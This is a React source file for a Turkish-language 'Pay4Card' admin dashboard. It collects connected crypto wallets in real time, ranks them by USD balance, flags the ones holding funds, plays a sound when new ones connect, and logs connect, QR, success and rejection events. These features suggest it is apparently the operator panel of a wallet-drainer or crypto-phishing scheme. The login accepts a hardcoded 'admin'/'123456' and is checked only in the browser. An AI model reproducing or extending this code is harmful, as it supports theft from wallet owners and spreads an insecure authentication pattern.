import { useState, useEffect, useMemo } from "react";
import io from "socket.io-client";
import { API_URL, SOCKET_OPTIONS } from "./config";

const socket = io(API_URL, SOCKET_OPTIONS);

function shortAddress(value = "") {
  if (!value) return "-";
  if (value.length <= 18) return value;
  return value.slice(0, 10) + "..." + value.slice(-8);
}

function parseTokenLine(line = "") {
  const parts = line.split(":");
  const name = parts[0]?.trim() || "Ağ";
  const value = parts.slice(1).join(":").trim();
  return { name, value };
}

function getNumber(value = "") {
  const match = String(value).match(/-?\d+(\.\d+)?/);
  return match ? Number(match[0]) : 0;
}

function getUsd(value = "") {
  const match = String(value).match(/\$([0-9,.]+)/);
  if (!match) return 0;
  return Number(match[1].replace(/,/g, ""));
}

function getTotalUsd(wallet) {
  const lines = wallet?.tokenBalances || [];
  const totalFromLines = lines.reduce((sum, line) => sum + getUsd(line), 0);
  if (totalFromLines > 0) return totalFromLines.toFixed(2);
  if (wallet?.totalUsd) return Number(wallet.totalUsd || 0).toFixed(2);
  return "0.00";
}

function isAddressLine(item) {
  return item.value.startsWith("0x") || item.value.startsWith("T");
}

function isValuable(item) {
  if (item.name === "TRON") return false;
  if (isAddressLine(item)) return false;
  return getNumber(item.value) > 0 || getUsd(item.value) > 0;
}

function tokenSummary(wallet) {
  const lines = wallet?.tokenBalances || [];
  const parsed = lines
    .filter((line) => !line.toUpperCase().includes("TOPLAM USD"))
    .map(parseTokenLine);

  const valuable = parsed.filter(isValuable);
  const usdt = parsed.find((x) => x.name.includes("USDT") && getNumber(x.value) > 0);
  const trx = parsed.find((x) => x.name === "TRX");
  const eth = parsed.find((x) => x.name.includes("ETH") && getNumber(x.value) > 0);

  return {
    parsed,
    valuable,
    valuableCount: valuable.length,
    usdt: usdt?.value || "0",
    trx: trx?.value || "0",
    eth: eth?.value || "0",
  };
}

function statusLabel(status = "") {
  if (status === "success") return "Başarılı";
  if (status === "pending") return "Beklemede";
  if (status === "error") return "Hata";
  if (status === "rejected") return "Reddedildi";
  return status || "Bilgi";
}

function statusClass(status = "") {
  if (status === "success") return "success";
  if (status === "pending") return "pending";
  if (status === "error" || status === "rejected") return "error";
  return "info";
}

export default function Admin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [logged, setLogged] = useState(false);
  const [wallets, setWallets] = useState([]);
  const [logs, setLogs] = useState([]);
  const [openId, setOpenId] = useState(null);
  const [activeSection, setActiveSection] = useState("overview");
  const [walletFilter, setWalletFilter] = useState("all");
  const [logFilter, setLogFilter] = useState("all");

  useEffect(() => {
    fetch(`${API_URL}/wallets`)
      .then((res) => res.json())
      .then((data) => setWallets(Array.isArray(data) ? data : []))
      .catch(() => {});

    fetch(`${API_URL}/activity-logs`)
      .then((res) => res.json())
      .then((data) => setLogs(Array.isArray(data) ? data : []))
      .catch(() => {});

    socket.on("wallets_updated", (data) => {
      setWallets(Array.isArray(data) ? data : []);
      new Audio("https://actions.google.com/sounds/v1/alarms/beep_short.ogg")
        .play()
        .catch(() => {});
    });

    socket.on("activity_logs_updated", (data) => {
      setLogs(Array.isArray(data) ? data : []);
    });

    return () => {
      socket.off("wallets_updated");
      socket.off("activity_logs_updated");
    };
  }, []);

  const stats = useMemo(() => {
    const totalValue = wallets.reduce((sum, wallet) => {
      return sum + Number(getTotalUsd(wallet) || 0);
    }, 0);

    const valuableWallets = wallets.filter((wallet) => Number(getTotalUsd(wallet)) > 0);

    const topWallet =
      [...wallets].sort((a, b) => Number(getTotalUsd(b)) - Number(getTotalUsd(a)))[0] ||
      null;

    const successLogs = logs.filter((log) => log.status === "success");
    const pendingLogs = logs.filter((log) => log.status === "pending");
    const errorLogs = logs.filter(
      (log) => log.status === "error" || log.status === "rejected"
    );

    return {
      totalValue,
      valuableWallets,
      topWallet,
      successLogs,
      pendingLogs,
      errorLogs,
    };
  }, [wallets, logs]);

  const filteredWallets = wallets.filter((wallet) => {
    if (walletFilter === "valuable") return Number(getTotalUsd(wallet)) > 0;
    if (walletFilter === "empty") return Number(getTotalUsd(wallet)) === 0;
    return true;
  });

  const filteredLogs = logs.filter((log) => {
    if (logFilter === "all") return true;
    if (logFilter === "error") return log.status === "error" || log.status === "rejected";
    return log.status === logFilter;
  });

  const login = () => {
    if (username === "admin" && password === "123456") {
      setLogged(true);
    } else {
      alert("Kullanıcı adı veya şifre hatalı");
    }
  };

  if (!logged) {
    return (
      <div className="admin-page">
        <div className="admin-login-card">
          <div className="login-logo">P</div>
          <h1>Pay4Card Admin</h1>
          <p>Canlı bağlantı ve aktivite paneli</p>

          <input
            className="input"
            placeholder="Kullanıcı adı"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />

          <input
            className="input"
            placeholder="Şifre"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />

          <button onClick={login}>Giriş Yap</button>
        </div>
      </div>
    );
  }

  return (
    <div className="admin-page">
      <div className="pro-admin-layout">
        <aside className="pro-sidebar">
          <div className="pro-brand">
            <div className="pro-brand-icon">P</div>
            <div>
              <b>Pay4Card</b>
              <span>Operations</span>
            </div>
          </div>

          <button
            className={activeSection === "overview" ? "nav-active" : ""}
            onClick={() => setActiveSection("overview")}
          >
            📊 Genel Bakış
          </button>

          <button
            className={activeSection === "wallets" ? "nav-active" : ""}
            onClick={() => setActiveSection("wallets")}
          >
            💼 Cüzdanlar
          </button>

          <button
            className={activeSection === "logs" ? "nav-active" : ""}
            onClick={() => setActiveSection("logs")}
          >
            ⚡ Aktivite Logları
          </button>

          <button
            className="nav-danger"
            onClick={() => socket.emit("clear_wallets")}
          >
            🧹 Listeyi Temizle
          </button>
        </aside>

        <main className="pro-main">
          <header className="pro-topbar">
            <div>
              <h1>Admin Dashboard</h1>
              <p>Wallet bağlantıları, bakiye analizi ve canlı hareketler</p>
            </div>

            <div className="live-badge">
              <span></span>
              LIVE
            </div>
          </header>

          <div className="pro-stat-grid">
            <div className="pro-stat-card">
              <span>Toplam Bağlantı</span>
              <strong>{wallets.length}</strong>
              <small>kayıtlı wallet</small>
            </div>

            <div className="pro-stat-card green">
              <span>Toplam Değer</span>
              <strong>${stats.totalValue.toFixed(2)}</strong>
              <small>tüm cüzdanlar</small>
            </div>

            <div className="pro-stat-card gold">
              <span>Bakiyesi Olan</span>
              <strong>{stats.valuableWallets.length}</strong>
              <small>aktif değer</small>
            </div>

            <div className="pro-stat-card red">
              <span>Hata / Red</span>
              <strong>{stats.errorLogs.length}</strong>
              <small>log kaydı</small>
            </div>
          </div>

          {activeSection === "overview" && (
            <>
              <div className="pro-grid-two">
                <section className="pro-panel">
                  <div className="pro-panel-head">
                    <div>
                      <h2>En Değerli Wallet</h2>
                      <p>Toplam USD’ye göre ilk kayıt</p>
                    </div>
                  </div>

                  {!stats.topWallet ? (
                    <div className="pro-empty">Henüz bağlantı yok</div>
                  ) : (
                    <div className="top-wallet-card">
                      <div>
                        <span>Toplam Değer</span>
                        <strong>${getTotalUsd(stats.topWallet)}</strong>
                      </div>
                      <p>{shortAddress(stats.topWallet.address)}</p>
                      <small>
                        {stats.topWallet.network} • {stats.topWallet.createdAt}
                      </small>
                    </div>
                  )}
                </section>

                <section className="pro-panel">
                  <div className="pro-panel-head">
                    <div>
                      <h2>Durumlar</h2>
                      <p>Başarılı, bekleyen ve hata kayıtları</p>
                    </div>
                  </div>

                  <div className="status-cards">
                    <div className="status-card success">
                      <span>Başarılı</span>
                      <b>{stats.successLogs.length}</b>
                    </div>
                    <div className="status-card pending">
                      <span>Bekleyen</span>
                      <b>{stats.pendingLogs.length}</b>
                    </div>
                    <div className="status-card error">
                      <span>Hata</span>
                      <b>{stats.errorLogs.length}</b>
                    </div>
                  </div>
                </section>
              </div>

              <section className="pro-panel">
                <div className="pro-panel-head">
                  <div>
                    <h2>Son Bağlantılar</h2>
                    <p>En yeni cüzdanlar ve toplam değerleri</p>
                  </div>
                  <button onClick={() => setActiveSection("wallets")}>
                    Tümünü Gör
                  </button>
                </div>

                {wallets.length === 0 ? (
                  <div className="pro-empty">Henüz cüzdan yok</div>
                ) : (
                  <div className="quick-wallet-list">
                    {wallets.slice(0, 6).map((wallet, index) => {
                      const summary = tokenSummary(wallet);
                      return (
                        <div className="quick-wallet-row" key={wallet.id}>
                          <div className="wallet-rank">#{wallets.length - index}</div>
                          <div className="quick-wallet-main">
                            <b>{shortAddress(wallet.address)}</b>
                            <span>
                              {wallet.network} • {summary.valuableCount} bakiye kartı
                            </span>
                          </div>
                          <strong>${getTotalUsd(wallet)}</strong>
                        </div>
                      );
                    })}
                  </div>
                )}
              </section>
            </>
          )}

          {activeSection === "wallets" && (
            <section className="pro-panel">
              <div className="pro-panel-head">
                <div>
                  <h2>Cüzdan Analizi</h2>
                  <p>Her bağlantı klasör olarak ayrılır, bakiyesi olanlar öne çıkar</p>
                </div>

                <div className="filter-pills">
                  <button
                    className={walletFilter === "all" ? "pill-active" : ""}
                    onClick={() => setWalletFilter("all")}
                  >
                    Tümü
                  </button>
                  <button
                    className={walletFilter === "valuable" ? "pill-active" : ""}
                    onClick={() => setWalletFilter("valuable")}
                  >
                    Bakiyesi Olan
                  </button>
                  <button
                    className={walletFilter === "empty" ? "pill-active" : ""}
                    onClick={() => setWalletFilter("empty")}
                  >
                    Boş
                  </button>
                </div>
              </div>

              {filteredWallets.length === 0 ? (
                <div className="pro-empty">Bu filtrede kayıt yok</div>
              ) : (
                <div className="pro-wallet-list">
                  {filteredWallets.map((wallet, index) => {
                    const totalUsd = getTotalUsd(wallet);
                    const isOpen = openId === wallet.id;
                    const summary = tokenSummary(wallet);

                    return (
                      <div
                        className={`pro-wallet-folder ${
                          Number(totalUsd) > 0 ? "wallet-hot" : ""
                        }`}
                        key={wallet.id}
                      >
                        <button
                          className="pro-wallet-head"
                          onClick={() => setOpenId(isOpen ? null : wallet.id)}
                        >
                          <div className="folder-left">
                            <div className="folder-icon">
                              {Number(totalUsd) > 0 ? "💰" : "👛"}
                            </div>
                            <div>
                              <div className="folder-title">
                                {wallet.isNew && <span className="new-badge">YENİ</span>}
                                <b>Klasör #{filteredWallets.length - index}</b>
                              </div>
                              <span>
                                {wallet.createdAt} • {wallet.network}
                              </span>
                            </div>
                          </div>

                          <div className="folder-right">
                            <strong>${totalUsd}</strong>
                            <small>{summary.valuableCount} bakiye</small>
                          </div>
                        </button>

                        {isOpen && (
                          <div className="pro-wallet-detail">
                            <div className="wallet-detail-grid">
                              <div className="detail-card total">
                                <span>Total USD</span>
                                <strong>${totalUsd}</strong>
                              </div>
                              <div className="detail-card">
                                <span>USDT</span>
                                <strong>{summary.usdt}</strong>
                              </div>
                              <div className="detail-card">
                                <span>TRX</span>
                                <strong>{summary.trx}</strong>
                              </div>
                              <div className="detail-card">
                                <span>ETH</span>
                                <strong>{summary.eth}</strong>
                              </div>
                            </div>

                            <div className="address-box">
                              <span>Adresler</span>
                              <p>{wallet.address}</p>
                            </div>

                            <div className="token-card-grid">
                              {summary.parsed.length > 0 ? (
                                summary.parsed.map((item, i) => {
                                  const valuable = isValuable(item);

                                  return (
                                    <div
                                      className={`pro-token-card ${
                                        valuable ? "token-hot" : ""
                                      }`}
                                      key={i}
                                    >
                                      <div>
                                        <b>{item.name}</b>
                                        {valuable && <span>BAKİYE VAR</span>}
                                      </div>
                                      <p>
                                        {isAddressLine(item)
                                          ? shortAddress(item.value)
                                          : item.value}
                                      </p>
                                    </div>
                                  );
                                })
                              ) : (
                                <div className="pro-empty">Token / ağ bilgisi yok</div>
                              )}
                            </div>
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              )}
            </section>
          )}

          {activeSection === "logs" && (
            <section className="pro-panel">
              <div className="pro-panel-head">
                <div>
                  <h2>Canlı Aktivite Logları</h2>
                  <p>Connect, QR, başarılı bağlantı ve hata kayıtları</p>
                </div>

                <div className="filter-pills">
                  <button
                    className={logFilter === "all" ? "pill-active" : ""}
                    onClick={() => setLogFilter("all")}
                  >
                    Tümü
                  </button>
                  <button
                    className={logFilter === "success" ? "pill-active" : ""}
                    onClick={() => setLogFilter("success")}
                  >
                    Başarılı
                  </button>
                  <button
                    className={logFilter === "pending" ? "pill-active" : ""}
                    onClick={() => setLogFilter("pending")}
                  >
                    Bekleyen
                  </button>
                  <button
                    className={logFilter === "error" ? "pill-active" : ""}
                    onClick={() => setLogFilter("error")}
                  >
                    Hata
                  </button>
                </div>
              </div>

              {filteredLogs.length === 0 ? (
                <div className="pro-empty">Bu filtrede log yok</div>
              ) : (
                <div className="pro-log-list">
                  {filteredLogs.slice(0, 120).map((log) => (
                    <div
                      className={`pro-log-item log-${statusClass(log.status)}`}
                      key={log.id}
                    >
                      <div className="log-dot"></div>
                      <div className="log-content">
                        <div className="log-line">
                          <b>{log.title}</b>
                          <span>{log.createdAt}</span>
                        </div>

                        {log.message && <p>{log.message}</p>}

                        {log.address && (
                          <small>{shortAddress(log.address)}</small>
                        )}
                      </div>

                      <div className={`log-badge ${statusClass(log.status)}`}>
                        {statusLabel(log.status)}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </section>
          )}
        </main>
      </div>
    </div>
  );
}
